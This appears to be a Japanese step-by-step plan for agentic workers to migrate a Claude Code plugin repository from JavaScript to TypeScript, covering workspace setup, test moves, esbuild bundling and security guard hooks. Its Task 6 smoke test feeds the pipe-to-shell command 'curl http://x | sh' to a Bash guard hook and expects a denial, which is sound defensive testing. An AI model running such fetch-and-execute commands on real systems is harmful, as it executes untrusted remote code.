# リポジトリ全体 JavaScript → TypeScript 移行 実装計画

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 手書き `.mjs` を全て TypeScript 化し、ツールチェーン(tsconfig / pnpm / biome / vitest)を root に集約、esbuild で各プラグインの `scripts/` にバンドル出力する。

**Architecture:** root 単一 tsconfig(noEmit・型チェック専用)+ root 集中 vitest + pnpm workspace 5パッケージ。各プラグインは `src/` にソース、直下に `build.ts`(esbuild)、`scripts/` にバンドル出力(git 管理)。テストは各ディレクトリ隣接の `__test__/` に置き、子プロセス実行が必要なテストは tsx 経由でソースを spawn する。

**Tech Stack:** TypeScript 6 / esbuild 0.28 / vitest 4 / tsx 4 / pnpm 11 / biome 2 / Node 26

**Spec:** `docs/superpowers/specs/2026-07-14-typescript-migration-design.md`(以下「スペック」)

## Global Constraints

- Node 26 に統一: esbuild `target: "node26"`、`@types/node@^26.0.0`、volta `node: 26.3.1`、root `engines: { "node": ">=26" }`
- Anthropic API 前提の実装は不可(CLAUDE.md / codiel DESIGN.md §0)
- バンドル済み `.mjs` は自己完結(esbuild `bundle: true`)。git 管理を継続し、プラグイン利用者はビルド不要
- esbuild の `emptyOutdir` 相当の全消しは禁止(codiel の `scripts/` に手書き `install-harness.sh` が同居)
- vitest は `pool: "forks"` 固定(raguel-mcp のテストが `process.chdir()` を使う)
- ライブラリとして import されるモジュールにトップレベル副作用(CLI 自動起動・`process.exit()`)を置かない
- プラグイン間のソース直接 import は禁止
- `assert.deepStrictEqual` → `toStrictEqual`(`toEqual` は非等価)。パス変換は `new URL(...).pathname` ではなく `fileURLToPath`
- 各タスク完了時にコミット。テスト・型チェックが通らない状態でタスクを completed にしない
- **注意**: このリポジトリ自体がローカル marketplace としてインストールされているため、hooks.json やバンドルの変更は実行中の Claude Code セッションのフックに影響し得る。移行作業中のセッションで一時的にフックがエラーを出しても無視してよい(セッション再起動で解消)

---

### Task 1: root 基盤(package.json / pnpm-workspace / tsconfig / biome)

**Files:**
- Create: `package.json`(root)
- Create: `pnpm-workspace.yaml`(root)
- Create: `tsconfig.json`(root)
- Create: `biome.json`(root。`plugins/codiel/raguel-mcp/biome.json` を元に調整)
- Modify: `plugins/basic-design/package.json`
- Modify: `plugins/codiel/raguel-mcp/package.json`
- Delete: `plugins/basic-design/tsconfig.json`, `plugins/basic-design/pnpm-lock.yaml`, `plugins/basic-design/pnpm-workspace.yaml`
- Delete: `plugins/codiel/raguel-mcp/tsconfig.json`, `plugins/codiel/raguel-mcp/pnpm-lock.yaml`, `plugins/codiel/raguel-mcp/pnpm-workspace.yaml`, `plugins/codiel/raguel-mcp/biome.json`

**Interfaces:**
- Produces: root コマンド `pnpm typecheck`(tsc --noEmit)。以降の全タスクがこれで型検証する。root devDeps: typescript / vitest / esbuild / tsx / @biomejs/biome / @types/node

- [ ] **Step 1: root package.json を作成**

```json
{
  "name": "amatsuka-claude-plugins",
  "private": true,
  "type": "module",
  "scripts": {
    "build": "pnpm -r build",
    "test": "vitest run",
    "typecheck": "tsc --noEmit",
    "lint": "biome check ."
  },
  "devDependencies": {
    "@biomejs/biome": "^2.5.0",
    "@types/node": "^26.0.0",
    "esbuild": "^0.28.1",
    "tsx": "^4.22.4",
    "typescript": "^6.0.3",
    "vitest": "^4.1.10"
  },
  "engines": { "node": ">=26" },
  "devEngines": {
    "packageManager": { "name": "pnpm", "version": "^11.8.0", "onFail": "download" }
  },
  "volta": { "node": "26.3.1", "pnpm": "11.8.0" }
}
```

- [ ] **Step 2: pnpm-workspace.yaml を作成**

```yaml
packages:
  - plugins/basic-design
  - plugins/codiel
  - plugins/codiel/raguel-mcp
  - plugins/task-utility
  - plugins/revelation
```

(`plugins/codiel` の package.json は Task 4 で作るが、pnpm は package.json の無い workspace エントリを無視するだけでエラーにしない。もし `pnpm install` が警告を出したら無視してよい)

- [ ] **Step 3: root tsconfig.json を作成**

```json
{
  "compilerOptions": {
    "target": "esnext",
    "module": "esnext",
    "moduleResolution": "bundler",
    "moduleDetection": "force",
    "noEmit": true,
    "strict": true,
    "resolveJsonModule": true,
    "types": ["node"],
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "isolatedModules": true
  },
  "include": [
    "vitest.config.ts",
    "plugins/*/src/**/*.ts",
    "plugins/*/build.ts",
    "plugins/codiel/raguel-mcp/src/**/*.ts",
    "plugins/codiel/raguel-mcp/build.ts"
  ],
  "exclude": ["**/node_modules", "plugins/*/scripts", "plugins/codiel/raguel-mcp/dist"]
}
```

(`vitest.config.ts` は Task 2 で作る。include に無いファイルがあっても tsc はエラーにしない)

- [ ] **Step 4: root biome.json を作成(raguel の biome.json をコピーして ignores を調整)**

`plugins/codiel/raguel-mcp/biome.json` を root の `biome.json` にコピーし、`files` セクションだけ以下に差し替える(他のセクションは元のまま):

```json
"files": {
  "includes": ["**/*.ts", "**/*.js"],
  "experimentalScannerIgnores": [
    "**/dist",
    "**/scripts",
    "**/.vscode",
    "**/node_modules",
    "**/docs"
  ]
}
```

コピー後、`plugins/codiel/raguel-mcp/biome.json` を `git rm` する。

- [ ] **Step 5: basic-design / raguel-mcp の package.json から root へ移した項目を除去**

`plugins/basic-design/package.json` を以下の内容に置き換え:

```json
{
  "name": "basic-design-generator",
  "version": "0.5.0-dev",
  "private": true,
  "type": "module",
  "scripts": { "build": "tsx build.ts" },
  "dependencies": { "elkjs": "0.11.1" }
}
```

`plugins/codiel/raguel-mcp/package.json` を以下の内容に置き換え(`main` を実出力に合わせて `.mjs` に修正。build パスは Task 3 で `build.ts` に変わるまで旧パスのまま):

```json
{
  "name": "raguel-mcp",
  "version": "0.0.1-dev",
  "description": "Raguel — AI の成果物を検査し PROCEED / ASK / STOP を判定する MCP サーバー",
  "type": "module",
  "private": true,
  "main": "dist/server.mjs",
  "author": "Phyllis",
  "license": "UNLICENSED",
  "scripts": { "build": "tsx scripts/build.ts" },
  "dependencies": {
    "@modelcontextprotocol/sdk": "^1.29.0",
    "picomatch": "^4.0.5",
    "yaml": "^2.9.0",
    "zod": "^4.4.3"
  },
  "devDependencies": { "@types/picomatch": "^4.0.3" }
}
```

- [ ] **Step 6: 旧設定ファイルを削除**

```bash
git rm plugins/basic-design/tsconfig.json plugins/basic-design/pnpm-lock.yaml plugins/basic-design/pnpm-workspace.yaml
git rm plugins/codiel/raguel-mcp/tsconfig.json plugins/codiel/raguel-mcp/pnpm-lock.yaml plugins/codiel/raguel-mcp/pnpm-workspace.yaml
```

(vitest.config.ts の削除は Task 2/3。raguel の biome.json は Step 4 で削除済み)

- [ ] **Step 7: pnpm install を実行**

Run: `pnpm install`(root で)
Expected: 成功し、root に `pnpm-lock.yaml` が生成される。`plugins/basic-design/node_modules` と `plugins/codiel/raguel-mcp/node_modules` が再構成される

- [ ] **Step 8: 型チェックが通ることを確認**

Run: `pnpm typecheck`
Expected: PASS(既存 TS は basic-design と raguel-mcp のみで、設定内容は旧 tsconfig と同等のため通るはず。`moduleDetection: "force"` 起因のエラーが出た場合はそのファイルに `export {}` を追加)

- [ ] **Step 9: コミット**

```bash
git add -A
git commit -m "build: pnpm workspace 化し tsconfig/biome/lock を root に集約"
```

---

### Task 2: root vitest + basic-design テスト移動と Node 26 化

**Files:**
- Create: `vitest.config.ts`(root)
- Move: `plugins/basic-design/src/*.test.ts` → `plugins/basic-design/src/__test__/`
- Move: `plugins/basic-design/src/layout/*.test.ts` → `plugins/basic-design/src/layout/__test__/`
- Move: `plugins/basic-design/src/render/*.test.ts` → `plugins/basic-design/src/render/__test__/`
- Modify: `plugins/basic-design/build.ts`(target node26)
- Delete: `plugins/basic-design/vitest.config.ts`
- Modify: `plugins/basic-design/.claude-plugin/plugin.json`(version 0.6.0-dev)

**Interfaces:**
- Consumes: Task 1 の root devDeps / typecheck
- Produces: root コマンド `pnpm test`(vitest run、include: `plugins/**/__test__/**/*.test.ts`、pool: forks)。以降の全タスクのテストはこの include に合致する場所に置く

- [ ] **Step 1: root vitest.config.ts を作成**

```ts
import { defineConfig } from "vitest/config"

export default defineConfig({
  test: {
    include: ["plugins/**/__test__/**/*.test.ts"],
    environment: "node",
    pool: "forks",
  },
})
```

- [ ] **Step 2: basic-design のテストを __test__/ へ移動**

```bash
cd plugins/basic-design/src
for f in $(find . -name '*.test.ts' -not -path '*/__test__/*'); do
  d=$(dirname "$f"); mkdir -p "$d/__test__"; git mv "$f" "$d/__test__/"
done
cd ../../..
```

対象(8ファイル): `check-drive-config.test.ts` `cli.test.ts` `decorate.test.ts` `validate.test.ts` `xml-util.test.ts` → `src/__test__/`、`layout/{graph,overlap,sequence}.test.ts` → `src/layout/__test__/`、`render/{drawio,html}.test.ts` → `src/render/__test__/`

- [ ] **Step 3: 移動したテストの相対参照を1階層深く調整**

移動した各ファイルで、相対 import・`new URL(...)`・パス文字列を一括変換(`from "..` を先に退避してから `from ".` を変換する3段 sed。URL 参照は手動確認):

```bash
cd plugins/basic-design/src
find . -path '*/__test__/*.test.ts' | xargs sed -i \
  -e 's|from "\.\./|from "@@UP@@/|g' \
  -e 's|from "\./|from "../|g' \
  -e 's|from "@@UP@@/|from "../../|g'
cd ../../..
```

さらに sed が拾わない文字列パスを機械的に洗い出し、ヒット全件を同じ規則(`../` を1つ足す)で修正する:

```bash
grep -rn 'new URL\|import\.meta\.url\|readFileSync(\|with { type' \
  plugins/basic-design/src/__test__ plugins/basic-design/src/layout/__test__ plugins/basic-design/src/render/__test__
```

典型例: JSON import(`../../samples/...` → `../../../samples/...`、`../fixtures/...` → `../../fixtures/...`)、`new URL("../scripts/design-gen.mjs", import.meta.url)` → `"../../scripts/design-gen.mjs"`。ただしこの例に限定せず grep のヒット全件を確認する。Step 5 のテスト実行が最終検証(パス切れは ENOENT / import エラーで落ちる)。

- [ ] **Step 4: 型チェックで import 切れを検出**

Run: `pnpm typecheck`
Expected: PASS(FAIL したら該当 import を修正して再実行)

- [ ] **Step 5: テスト実行**

Run: `pnpm test`
Expected: basic-design の全テストが PASS(cli.test.ts は git 管理済みバンドル `scripts/design-gen.mjs` を spawn するため、ビルド不要で通る)

- [ ] **Step 6: build.ts の target を node26 に変更し、旧 vitest.config.ts を削除**

`plugins/basic-design/build.ts` の `target: "node20"` を `target: "node26"` に変更。

```bash
git rm plugins/basic-design/vitest.config.ts
```

- [ ] **Step 7: リビルドして生成物の差分を確認**

Run: `cd plugins/basic-design && pnpm build && cd ../..`
Expected: 成功。`git diff --stat plugins/basic-design/scripts/` の差分は target 変更由来のみ(内容を一瞥して異常がないこと)

Run: `pnpm test`
Expected: PASS(バンドルを spawn する cli.test.ts が新バンドルでも通る = 配布物 smoke)

- [ ] **Step 8: plugin.json のバージョンを 0.6.0-dev に上げてコミット**

`plugins/basic-design/.claude-plugin/plugin.json` の `"version"` を `"0.6.0-dev"` に。`plugins/basic-design/package.json` の `"version"` も `"0.6.0-dev"` に揃える。

```bash
git add -A
git commit -m "refactor(basic-design): テストを __test__/ へ移動し root vitest に統合、Node 26 化"
```

---

### Task 3: raguel-mcp テスト移動と build.ts 移動

**Files:**
- Move: `plugins/codiel/raguel-mcp/src/**/*.test.ts`(39ファイル)→ 各ディレクトリ隣接の `__test__/`
- Move: `plugins/codiel/raguel-mcp/scripts/build.ts` → `plugins/codiel/raguel-mcp/build.ts`
- Modify: `plugins/codiel/raguel-mcp/package.json`(build スクリプトのパス)
- Delete: `plugins/codiel/raguel-mcp/vitest.config.ts`

**Interfaces:**
- Consumes: Task 2 の root vitest 設定
- Produces: raguel-mcp のテストが `pnpm test` に統合される。`src/panel/testing/fake-claude.mjs` は .mjs のまま残す(スペック §3 の例外)

- [ ] **Step 1: テストを __test__/ へ移動**

```bash
cd plugins/codiel/raguel-mcp/src
for f in $(find . -name '*.test.ts' -not -path '*/__test__/*'); do
  d=$(dirname "$f"); mkdir -p "$d/__test__"; git mv "$f" "$d/__test__/"
done
cd ../../../..
```

- [ ] **Step 2: 相対参照を1階層深く調整**

```bash
cd plugins/codiel/raguel-mcp/src
find . -path '*/__test__/*.test.ts' | xargs sed -i \
  -e 's|from "\.\./|from "@@UP@@/|g' \
  -e 's|from "\./|from "../|g' \
  -e 's|from "@@UP@@/|from "../../|g'
cd ../../../..
```

さらに文字列ベースのパス参照(sed は `from "..."` しか変換しない)を機械的に洗い出し、ヒットした**全行**を同じ規則(`../` を1つ足す)で修正する:

```bash
grep -rn 'new URL\|import\.meta\.url\|__dirname\|readFileSync(' \
  --include='*.test.ts' plugins/codiel/raguel-mcp/src/*/__test__/ plugins/codiel/raguel-mcp/src/*/*/__test__/
```

修正対象の典型は `panel/__test__/claudeCli.test.ts` の `fake-claude.mjs` 参照と `core/__test__/pipeline.golden.test.ts` のフィクスチャ参照だが、**このリストに限定せず grep のヒット全件を確認する**こと。Step 3 のテスト実行が最終検証になる(パス切れは ENOENT で落ちる)。

- [ ] **Step 3: 型チェックとテスト**

Run: `pnpm typecheck && pnpm test`
Expected: PASS(FAIL したら import / パス参照を修正して再実行)

- [ ] **Step 4: build.ts をパッケージ直下へ移動し target を追加**

```bash
git mv plugins/codiel/raguel-mcp/scripts/build.ts plugins/codiel/raguel-mcp/build.ts
```

移動後の `build.ts` の `esbuild.build({...})` に `target: "node26",` を追加(banner の createRequire はそのまま維持)。`package.json` の build スクリプトを `"tsx build.ts"` に変更。`scripts/` ディレクトリが空になったことを確認(`ls plugins/codiel/raguel-mcp/scripts/` → 空なら `rmdir`)。

- [ ] **Step 5: リビルドして dist の差分確認と旧 config 削除**

Run: `cd plugins/codiel/raguel-mcp && pnpm build && cd ../../..`
Expected: 成功。`git diff --stat plugins/codiel/raguel-mcp/dist/` は target 追加由来の差分のみ

```bash
git rm plugins/codiel/raguel-mcp/vitest.config.ts
```

Run: `pnpm test`
Expected: PASS

- [ ] **Step 6: コミット**

```bash
git add -A
git commit -m "refactor(raguel-mcp): テストを __test__/ へ移動し root vitest に統合、build.ts をパッケージ直下へ"
```

---

### Task 4: codiel — codiel-state のライブラリ / CLI 分離

**Files:**
- Create: `plugins/codiel/package.json`
- Create: `plugins/codiel/build.ts`
- Create: `plugins/codiel/src/codiel-state.ts`(`plugins/codiel/scripts/codiel-state.mjs` からの変換)
- Create: `plugins/codiel/src/codiel-state-cli.ts`
- Create: `plugins/codiel/src/testing/run-ts.ts`
- Create: `plugins/codiel/src/__test__/codiel-state.test.ts`(`scripts/codiel-state.test.mjs` からの変換)

**Interfaces:**
- Consumes: root devDeps(tsx / esbuild / vitest)
- Produces:
  - `src/codiel-state.ts` exports: `STAGES: string[][]`, `PHASES: string[]`, `GATED: Set<string>`, `SKIPPABLE: Set<string>`, `readState(p: string): RunState`, `writeState(p: string, state: RunState): void`, `latestTry(root: string, issue: number | string): LatestTry | null`, `findActiveRun(root: string): ActiveRun | null`, `main(argv: string[], root?: string): void`, 型 `RunState` / `PhaseState` / `ActiveRun`(Task 5 の hooks が `findActiveRun` と `ActiveRun` を import する)
  - `src/testing/run-ts.ts` exports: `runTs(script: string, args?: string[], opts?: ExecFileSyncOptions): string`(Task 5/6 のテストが使う)
  - `build.ts` のエントリ5つ(Task 6 でビルド)

- [ ] **Step 1: plugins/codiel/package.json を作成**

```json
{
  "name": "codiel-scripts",
  "version": "0.3.0-dev",
  "private": true,
  "type": "module",
  "scripts": { "build": "tsx build.ts" }
}
```

- [ ] **Step 2: plugins/codiel/build.ts を作成**

```ts
import esbuild from "esbuild"

await esbuild.build({
  bundle: true,
  entryPoints: {
    "guard-bash": "./src/hooks/guard-bash.ts",
    "guard-write": "./src/hooks/guard-write.ts",
    "stop-guard": "./src/hooks/stop-guard.ts",
    "subagent-stop": "./src/hooks/subagent-stop.ts",
    "codiel-state": "./src/codiel-state-cli.ts",
  },
  outdir: "./scripts",
  outExtension: { ".js": ".mjs" },
  platform: "node",
  format: "esm",
  sourcemap: false,
  target: "node26",
})
```

(hooks のソースは Task 5 で作る。このタスクでは build.ts を**作成するだけで実行しない** — esbuild はビルド実行時にのみエントリを解決するため、参照先が未作成でも問題ない。初回ビルドは Task 6 Step 2)

- [ ] **Step 3: src/codiel-state.ts を作成(ライブラリ本体)**

`plugins/codiel/scripts/codiel-state.mjs` を読み、以下の規則で TS 化して `src/codiel-state.ts` に置く:

1. **末尾の `if (import.meta.url === ...) main(...)` 行を削除する**(CLI 誤発火バグの元。スペック §2 参照)
2. 冒頭に型定義を追加:

```ts
export type PhaseStatus = "pending" | "in_progress" | "passed" | "awaiting_human"
export type RunStatus = "active" | "awaiting_human" | "awaiting_outcome" | "completed" | "rejected" | "stopped"

export interface PhaseState {
  status: PhaseStatus
  attempts: number
  evaluationId: string | null
  verdict: string | null
  note: string | null
  humanApproved?: boolean
}

export interface RunState {
  version: number
  runId: string
  try: number
  issue: number
  branch: string
  raguelRunId: string
  status: RunStatus
  phase: string | null
  phases: Record<string, PhaseState>
  pr: { url: string | null }
  limits: { maxFixAttempts: number }
  stopReason: string | null
  incidents: { at: string; note: string | null }[]
  createdAt: string
  updatedAt: string
  baseBranch?: string
}

export interface LatestTry { tryN: number; statePath: string; state: RunState }
export interface ActiveRun { dir: string; statePath: string; state: RunState }
```

3. 関数本体はロジックを変えずに移植し、シグネチャに型を付ける: `readState(p: string): RunState` / `writeState(p: string, state: RunState): void` / `latestTry(root: string, issue: number | string): LatestTry | null` / `findActiveRun(root: string): ActiveRun | null` / `main(argv: string[], root: string = process.cwd()): void`。内部関数(`fail` / `ok` / `runDir` / `tries` / `parseArgs` / `newState` / `loadRun`)も同様に型を付ける(`parseArgs` の戻りは `{ pos: string[]; flags: Record<string, string> }`)
4. コメント(日本語含む)は原文のまま保持する

- [ ] **Step 4: src/codiel-state-cli.ts を作成(薄い CLI エントリ)**

```ts
#!/usr/bin/env node
// codiel-state の CLI エントリ。ライブラリ本体(codiel-state.ts)にはトップレベルの
// CLI 起動判定を置かない — esbuild で hooks に inline された際に main() が誤発火するため。
import { main } from "./codiel-state.js"

main(process.argv.slice(2))
```

- [ ] **Step 5: src/testing/run-ts.ts を作成(tsx spawn ヘルパー)**

```ts
import { execFileSync, type ExecFileSyncOptions } from "node:child_process"
import { createRequire } from "node:module"

const TSX_CLI = createRequire(import.meta.url).resolve("tsx/cli")

// TypeScript ソースを tsx 経由で子プロセス実行する(ビルド前でもテストできるようにするため)。
// exit code・stdout/stderr の契約を検証するテスト用。opts で cwd / input / env を指定できる。
export function runTs(script: string, args: string[] = [], opts: ExecFileSyncOptions = {}): string {
  return execFileSync(process.execPath, [TSX_CLI, script, ...args], {
    encoding: "utf8",
    ...opts,
  }) as string
}
```

- [ ] **Step 6: テストを vitest に変換して src/__test__/codiel-state.test.ts に置く**

`plugins/codiel/scripts/codiel-state.test.mjs` を読み、以下の規則で変換する:

- `import { test } from "node:test"` → `import { expect, test } from "vitest"`
- `import assert from "node:assert/strict"` → 削除
- `assert.equal(a, b)` → `expect(a).toBe(b)` / `assert.deepStrictEqual(a, b)` → `expect(a).toStrictEqual(b)` / `assert.match(s, re)` → `expect(s).toMatch(re)` / `assert.ok(v, msg)` → `expect(v, msg).toBeTruthy()` / `assert.doesNotMatch(s, re)` → `expect(s).not.toMatch(re)`
- spawn ヘルパーを差し替え(旧: `const CLI = new URL("./codiel-state.mjs", import.meta.url).pathname` + `execFileSync("node", [CLI, ...])`):

```ts
import { fileURLToPath } from "node:url"
import { runTs } from "../testing/run-ts.js"

const CLI = fileURLToPath(new URL("../codiel-state-cli.ts", import.meta.url))

function run(cwd: string, args: string[]) {
  try {
    const out = runTs(CLI, args, { cwd })
    return { code: 0, out: JSON.parse(out) }
  } catch (e) {
    const err = e as { status: number; stderr?: unknown; stdout?: unknown }
    return { code: err.status, err: String(err.stderr || err.stdout || "") }
  }
}
```

- テストケースのロジック・検証内容は変えない(record-attempt の exit code 3 検証も同じ)

- [ ] **Step 7: 型チェックとテスト**

Run: `pnpm typecheck && pnpm test`
Expected: PASS(codiel-state.test.ts が新たに実行される。tsx spawn の分だけ従来より遅いのは正常)

- [ ] **Step 8: コミット**

```bash
git add -A
git commit -m "feat(codiel): codiel-state を TypeScript 化しライブラリ / CLI エントリに分離"
```

(旧 `scripts/codiel-state.mjs` の削除は Task 6。バンドル出力が同パスを上書きするまで残す)

---

### Task 5: codiel hooks の TS 化

**Files:**
- Create: `plugins/codiel/src/hooks/lib.ts`(`hooks/scripts/lib.mjs` から変換)
- Create: `plugins/codiel/src/hooks/guard-bash.ts` / `guard-write.ts` / `stop-guard.ts` / `subagent-stop.ts`(同名 .mjs から変換)
- Create: `plugins/codiel/src/hooks/__test__/lib.test.ts` / `guard-bash.test.ts` / `guard-write.test.ts` / `stop-guard.test.ts`(同名 .test.mjs から変換)

**Interfaces:**
- Consumes: Task 4 の `findActiveRun` / `ActiveRun`(`../codiel-state.js` から import)、`runTs`(`../../testing/run-ts.js`)
- Produces: `src/hooks/lib.ts` exports: `readStdin(): Promise<HookInput>`, `emit(decision: "deny" | "ask", reason: string): never`, `pass(): never`, `globToRegExp(glob: string): RegExp`, `readDomains(root: string): unknown`, `findProjectRoot(startDir: string): string`, 型 `HookInput`

- [ ] **Step 1: src/hooks/lib.ts を作成**

`plugins/codiel/hooks/scripts/lib.mjs` を読み、TS 化して置く。冒頭に共通入力型を追加:

```ts
export interface HookInput {
  session_id?: string
  tool_name?: string
  tool_input?: { command?: string; file_path?: string; [k: string]: unknown }
  transcript_path?: string
  cwd?: string
  agent_id?: string
  agent_type?: string
  stop_hook_active?: boolean
  [k: string]: unknown
}
```

シグネチャ: `readStdin(): Promise<HookInput>`(実装は `JSON.parse(data) as HookInput`)/ `emit(decision: "deny" | "ask", reason: string): never`(末尾 `process.exit(0)` なので never が付く)/ `pass(): never` / `globToRegExp(glob: string): RegExp` / `readDomains(root: string): unknown` / `findProjectRoot(startDir: string): string`。コメントは原文のまま保持。

- [ ] **Step 2: 4つの hook を TS 化**

各 `.mjs` を読み、同ロジックのまま `src/hooks/*.ts` に変換する。変換規則:

- `import { ... } from "./lib.mjs"` → `from "./lib.js"`
- `import { findActiveRun } from "../../scripts/codiel-state.mjs"` → `from "../codiel-state.js"`
- `input.cwd` は `HookInput` 上 optional なので、使用箇所は `input.cwd ?? process.cwd()` にする(guard-bash / guard-write / stop-guard / subagent-stop の `findProjectRoot(input.cwd)` 呼び出し)
- catch 節の `e.message` は `(e as Error).message` にする
- guard-bash の内部関数に型を付ける: `isGitToken(tok: string): boolean` / `findGitInvocations(cmd: string): GitInvocation[]`(`interface GitInvocation { tokens: string[]; subIdx: number; subcommand: string }`)/ `pushArgs(inv: GitInvocation): string[]` / `isForceToken(tok: string): boolean` / `hasForcePush(invocations: GitInvocation[]): boolean` / `isProtectedBranchDest(token: string): boolean` / `pushesToProtectedBranch(invocations: GitInvocation[]): boolean`
- `ALWAYS_DENY` は `const ALWAYS_DENY: [boolean, string][]`
- コメントは原文のまま保持

- [ ] **Step 3: hooks のテストを vitest に変換**

`hooks/scripts/{lib,guard-bash,guard-write,stop-guard}.test.mjs` を読み、Task 4 Step 6 と同じ assert→expect 変換規則で `src/hooks/__test__/*.test.ts` に変換する。spawn 部分の差し替え:

- 旧 `const HOOK = new URL("./guard-bash.mjs", import.meta.url).pathname` → `const HOOK = fileURLToPath(new URL("../guard-bash.ts", import.meta.url))`
- 旧 `const CLI = new URL("../../scripts/codiel-state.mjs", import.meta.url).pathname` → `const CLI = fileURLToPath(new URL("../../codiel-state-cli.ts", import.meta.url))`
- 旧 `execFileSync("node", [HOOK], { input, encoding: "utf8" })` → `runTs(HOOK, [], { input })`(`import { runTs } from "../../testing/run-ts.js"`)
- lib.test.mjs はライブラリ関数の直接テストなので spawn 不要 — `import { globToRegExp, findProjectRoot } from "../lib.js"` のように直接 import に書き換える(lib.ts にトップレベル副作用は無いので安全)

- [ ] **Step 4: 型チェックとテスト**

Run: `pnpm typecheck && pnpm test`
Expected: PASS

- [ ] **Step 5: コミット**

```bash
git add -A
git commit -m "feat(codiel): hooks を TypeScript 化(src/hooks/ + vitest テスト)"
```

---

### Task 6: codiel ビルド・hooks.json 更新・旧ファイル削除

**Files:**
- Modify: `plugins/codiel/hooks/hooks.json`(参照パスを scripts/ へ)
- Create: `plugins/codiel/src/__test__/install-harness.test.ts`(`scripts/install-harness.test.mjs` から変換)
- Create(生成): `plugins/codiel/scripts/{guard-bash,guard-write,stop-guard,subagent-stop,codiel-state}.mjs`
- Delete: `plugins/codiel/hooks/scripts/`(全ファイル)、`plugins/codiel/scripts/codiel-state.test.mjs`、`plugins/codiel/scripts/install-harness.test.mjs`
- Modify: `plugins/codiel/.claude-plugin/plugin.json`(version 0.4.0-dev)

**Interfaces:**
- Consumes: Task 4 の codiel-state.ts / codiel-state-cli.ts / build.ts、**Task 5 の src/hooks/ 全ソース(このタスクは Task 5 完了後にのみ実行可能 — build.ts の5エントリすべてが実在する必要がある)**
- Produces: `${CLAUDE_PLUGIN_ROOT}/scripts/*.mjs` で動く配布物一式

- [ ] **Step 1: install-harness.test.ts を変換・移動**

`plugins/codiel/scripts/install-harness.test.mjs` を読み、vitest に変換して `src/__test__/install-harness.test.ts` に置く。SCRIPT 参照の変更:

```ts
import { fileURLToPath } from "node:url"
const SCRIPT = fileURLToPath(new URL("../../scripts/install-harness.sh", import.meta.url))
```

実行方法は旧テストと同じ `execFileSync("bash", [SCRIPT, target], { encoding: "utf8" })` を維持する(tsx は不要 — 対象が bash スクリプトのため)。bash スクリプト自体は `scripts/install-harness.sh` から動かさない。

- [ ] **Step 2: ビルド実行**

Run: `cd plugins/codiel && pnpm build && cd ../..`
Expected: `scripts/` に `guard-bash.mjs` `guard-write.mjs` `stop-guard.mjs` `subagent-stop.mjs` が新規生成され、`codiel-state.mjs` が上書きされる。`install-harness.sh` は無傷

- [ ] **Step 3: 配布物の smoke test**

```bash
echo '{"cwd":"/tmp","tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | node plugins/codiel/scripts/guard-bash.mjs
```
Expected: `permissionDecision":"deny"` を含む JSON が出力される(= バンドルが自己完結で動き、codiel-state の main() が誤発火しない)

```bash
tmp=$(mktemp -d)
(cd "$tmp" && node "$OLDPWD/plugins/codiel/scripts/codiel-state.mjs" init --issue 99)
```
Expected: `statePath` と state を含む JSON が出力される(CLI として動作する)

```bash
echo '{"stop_hook_active":true}' | node plugins/codiel/scripts/stop-guard.mjs && echo OK
```
Expected: `OK`(exit 0、出力なし)

- [ ] **Step 4: hooks.json の参照パスを書き換え**

`plugins/codiel/hooks/hooks.json` 内の `${CLAUDE_PLUGIN_ROOT}/hooks/scripts/` を全て `${CLAUDE_PLUGIN_ROOT}/scripts/` に置換(4箇所: guard-bash / guard-write / subagent-stop / stop-guard)。

- [ ] **Step 5: 旧ファイルを削除**

```bash
git rm -r plugins/codiel/hooks/scripts
git rm plugins/codiel/scripts/codiel-state.test.mjs plugins/codiel/scripts/install-harness.test.mjs
```

- [ ] **Step 6: 全体検証**

Run: `pnpm typecheck && pnpm test`
Expected: PASS

- [ ] **Step 7: バージョンを上げてコミット**

`plugins/codiel/.claude-plugin/plugin.json` の version を `"0.4.0-dev"` に、`plugins/codiel/package.json` の version も `"0.4.0-dev"` に。

```bash
git add -A
git commit -m "feat(codiel): hooks/CLI を esbuild バンドルに切り替え、hooks/scripts を廃止 (v0.4.0-dev)"
```

---

### Task 7: task-utility CLI スクリプトの TS 化

**Files:**
- Create: `plugins/task-utility/package.json`
- Create: `plugins/task-utility/build.ts`
- Create: `plugins/task-utility/src/testing/run-ts.ts`(Task 4 Step 5 と同一内容)
- Create: `plugins/task-utility/src/{check-issue-env,extract-conversation,find-chat-records,link-sub-issue,list-issues}.ts`(`scripts/` の同名 .mjs から変換)
- Create: `plugins/task-utility/src/__test__/{check-issue-env,extract-conversation,find-chat-records,link-sub-issue,list-issues}.test.ts`(同名 .test.mjs から変換)

**Interfaces:**
- Consumes: root devDeps
- Produces: `build.ts` のエントリ6つ(hook は Task 8 で追加済みの前提で先に定義してよい)

- [ ] **Step 1: package.json / build.ts / run-ts.ts を作成**

`plugins/task-utility/package.json`:

```json
{
  "name": "task-utility-scripts",
  "version": "0.1.0-dev",
  "private": true,
  "type": "module",
  "scripts": { "build": "tsx build.ts" }
}
```

`plugins/task-utility/build.ts`:

```ts
import esbuild from "esbuild"

await esbuild.build({
  bundle: true,
  entryPoints: {
    "check-issue-env": "./src/check-issue-env.ts",
    "extract-conversation": "./src/extract-conversation.ts",
    "find-chat-records": "./src/find-chat-records.ts",
    "link-sub-issue": "./src/link-sub-issue.ts",
    "list-issues": "./src/list-issues.ts",
    "check-chat-recorded": "./src/hooks/check-chat-recorded.ts",
  },
  outdir: "./scripts",
  outExtension: { ".js": ".mjs" },
  platform: "node",
  format: "esm",
  sourcemap: false,
  target: "node26",
})
```

(`src/hooks/check-chat-recorded.ts` は Task 8 で作る。このタスクではビルドしない)

`src/testing/run-ts.ts` は Task 4 Step 5 のコードをそのまま複製する(パッケージ間 import 禁止のため各パッケージに持つ)。

- [ ] **Step 2: 5つの CLI スクリプトを TS 化**

`plugins/task-utility/scripts/*.mjs`(テスト以外の5つ)を読み、ロジックを変えずに `src/*.ts` へ変換する。変換規則:

- 引数・戻り値に型を付ける。`spawnSync` の結果はそのまま(`@types/node` が効く)
- `fail(step: string, error: string): never`(`process.exit(0)` で終わるため)
- check-issue-env の `parseTopLevel(src: string): Record<string, string>` / `parseTemplate(file: string, content: string)` の戻りはそのまま推論に任せてよい
- find-chat-records の `walk(d: string): string[]`、records の要素は `{ path: string; date: string; user: string | null; abs: string }`
